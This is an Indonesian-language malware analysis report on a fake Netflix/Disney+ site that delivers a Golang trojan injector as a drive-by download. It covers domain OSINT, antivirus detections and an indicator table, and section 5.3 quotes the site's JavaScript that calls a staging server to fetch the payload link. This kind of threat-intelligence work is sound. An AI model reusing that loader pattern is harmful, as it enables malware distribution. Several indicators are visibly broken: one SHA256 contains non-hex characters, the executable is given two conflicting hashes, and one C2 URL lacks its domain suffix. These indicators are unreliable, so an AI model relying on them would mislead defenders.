# Analisis Kampanye Drive-By Malware Delivery: Impersonasi Brand Disney/Netflix (cn-netflix[.]cn)

**Klasifikasi:** TLP:CLEAR (Research Purpose Only)  
**Penulis:** Kadek Dimas Agung Wisnu (Lorelei)  
**Tanggal:** 13 Agustus 2026  
**Disclaimer:** Analisis ini dilakukan murni untuk tujuan riset dan edukasi keamanan siber di lingkungan laboratorium terisolasi. Tidak ada data pribadi atau sistem produksi yang diekspos dalam proses analisis ini.

---

## 1. Executive Summary

Investigasi ini membedah kampanye *Malware Delivery* berbasis web yang memanfaatkan teknik penipuan visual (*brand impersonation*) gabungan antara merek Netflix dan Disney+. Berbeda dengan situs *credential harvesting* konvensional yang mengumpulkan password melalui formulir HTML, situs ini berfungsi sebagai vektor distribusi berkas berbahaya (*Drive-by Download*). 

Situs utama menggunakan pemanggilan API asinkron (*JavaScript Fetch*) ke server *staging/C2* eksternal untuk menarik tautan unduhan secara dinamis. Berkas payload berupa arsip `.zip` berisi biner *executable* bertipe Golang (`install_sint007.exe`). Pemindaian awal pada level arsip sempat mengindikasikan status *clean*, namun pembedahan biner secara independen mengonfirmasi bahwa sampel ini merupakan *Trojan Injector* yang terdeteksi oleh 9 vendor Anti-Virus utama.

---

## 2. Background & Motivasi

Penyebaran *Infostealer* dan *Trojan* melalui situs impersonasi media populer (seperti platform streaming dan perangkat lunak komersial) terus meningkat. Penelitian ini bertujuan membedah arsitektur pengiriman muatan berbahaya, memisahkan lapisan *frontend* (umpan visual) dengan *backend* (C2), serta menganalisis artefak biner yang didistribusikan hingga mengonfirmasi ancaman teknisnya.

---

## 3. Metodologi

| Komponen | Detail |
|---|---|
| **Environment** | Isolated VM (Kali Linux via VirtualBox, Network NAT Mode) |
| **Tools Statis CLI** | `curl`, `whois`, `dig`, `host`, `grep`, `strings`, `file` |
| **Tools OSINT & Sandbox** | VirusTotal, Hybrid Analysis, MetaDefender/OPSWAT |
| **Prinsip Keamanan** | Ekstraksi kode dan pembedahan biner dilakukan tanpa mengeksekusi payload di sistem host |

---

## 4. Timeline Investigasi

| Waktu | Aktivitas |
|---|---|
| 24 Juli 2026 | Domain `cn-netflix[.]cn` didaftarkan oleh *threat actor* |
| 13 Agustus 2026 | Pengumpulan data OSINT domain dan ekstraksi kode HTML/JS mentah |
| 13 Agustus 2026 | Analisis fungsi `fetch()` dan identifikasi server C2 (`noah-sk[.]com`) |
| 13 Agustus 2026 | Pengunduhan arsip `install_sint007.zip` dan pembedahan biner `install_sint007.exe` |
| 13 Agustus 2026 | Verifikasi deteksi Trojan pada OPSWAT MetaDefender (9/26 Detections) |

---

## 5. Technical Analysis

### 5.1 Infrastructure & OSINT Reconnaissance
Pemeriksaan DNS dan data pendaftaran domain menunjukkan beberapa indikator kejanggalan:

* **Domain Target:** `cn-netflix[.]cn`
* **Tanggal Registrasi:** 24 Juli 2026 (Teridentifikasi sebagai *Newly Registered Domain* / NRD).
* **Registrant Contact:** `alirezajobe171@gmail.com` (Menggunakan penyedia email gratisan, tidak sesuai standar entitas korporasi resmi).
* **Resolusi Alamat IP:** `154.19.248.17` (Diidentifikasi via perintah `dig` dan `host`).
* **Name Server:** `ns1.363.hk` & `ns2.363.hk` (Infrastruktur terdaftar di wilayah Hong Kong).

### 5.2 UI/UX Deception Analysis (Human Layer)
Secara visual, antarmuka situs menggunakan tema gelap dengan logo gabungan *Disney + 流媒体影视*. Terdapat ketidakcocokan (*mismatch*) struktural antara nama domain (`cn-netflix`) dengan konten UI yang didominasi teks dan logo Disney+. Hal ini mengindikasikan penggunaan *Phishing Kit/Template* massal oleh penyerang tanpa melakukan penyesuaian variabel footer secara menyeluruh.

### 5.3 Background API Request & Payload Binding (Code Layer)
Pemeriksaan kode HTML/JS menggunakan utilitas `grep` mengonfirmasi bahwa situs **tidak menggunakan formulir input login konvensional (`POST`)**. Situs ini mengeksekusi skrip JavaScript asinkron untuk menarik tautan unduhan dari infrastruktur terpisah di belakang layar:

```javascript
// Snippet temuan kode pada file chinese-phising.html
fetch('https://noah-sk[.]com/api.php')
  .then(function(r){ return r.json() })
  .then(function(d){
      if(d && d.code === 0 && d.download_link) bind(d.download_link)
  })
  .catch(function(){});
```

### Server C2 / Staging: `hxxps://noah-sk[.]/api.php`
### Mekanisme: 
Skrip mengirimkan permintaan HTTP ke noah-sk[.]com. Jika respon JSON mengembalikan variabel download_link, fungsi bind() akan menginjeksikan URL berkas .zip ke tombol di antarmuka web secara otomatis.

### 5.4 Binary Artifact Analysis & Trojan Confirmation (Binary Layer)

| **Artefak** | **Detail** |
|---|---|
| `install_sint007.zip` | Arsip pembawa muatan berbahaya. |
| `install_sint007.exe` | Biner *executable* hasil kompilasi dengan **Golang**. |
| **Deteksi AV** | Terdeteksi sebagai **Trojan** pada 9 dari 26 *engine* di platform OPSWAT MetaDefender. |
| **Indikator Teknis** | Biner ini diketahui berfungsi sebagai **Trojan Injector**, bertujuan menyisipkan kode berbahaya ke proses sistem yang sah (PID 2116) untuk menghindari deteksi dan mempertahankan persistensi di memori. |
| SHA256 Hash Biner | f7183fd3ffcfb291ald92dec3e551b89eb060lad5d574550bf86324161abd3af |
| **Hasil Deteksi AV (OPSWWAT META DEFENDER)**| 9/26 Vendor Detections (MALICIOUS) 
------

### Hasil Deteksi Vendor Utama
- Bitdefender & Emsisoft: Gen:Variant.Yogi.48158 (Trojan/Stealer Generic Variant)
- Huorong: HVM:Trojan/Injector.dn (Process Injector Capability)
- Avira & Vir.IT : TR/W64.Agent / Trojan.Win64.Agent.KBX (64-bit Trojan Agent)
- Ahnlab: Trojan /Win.Generic
---
## 6 IOC 

|Tipe| Nilai |Keterangan |
|---|---|---|
| Domain | cn-netflix[.]cn | Phishing Site |
| IP Address | 154.19.248.17 | Phishing Site |
| SHA256 Hash Biner | f7183fd3ffcfb291ald92dec3e551b89eb060lad5d574550bf86324161abd3af | Trojan |     |
| Hostname| noah-sk[.]com | C2/Staging Server |
| IPv4 | 154.19.248.17 | IP Server Hosting (landing page) |
|SHA 256(zip)| 1929f509a3c29e8dfb0ebb10d5b89085c1bca863980364e79f635b9a3c68cacb | Hash Zip install_sint007.zip |
|SHA 256(exe)| 999bb7fefddf57646a6f57907712c1b0163e877d7938e9ddc801124555696d71 | Hash Exe install_sint007.exe |

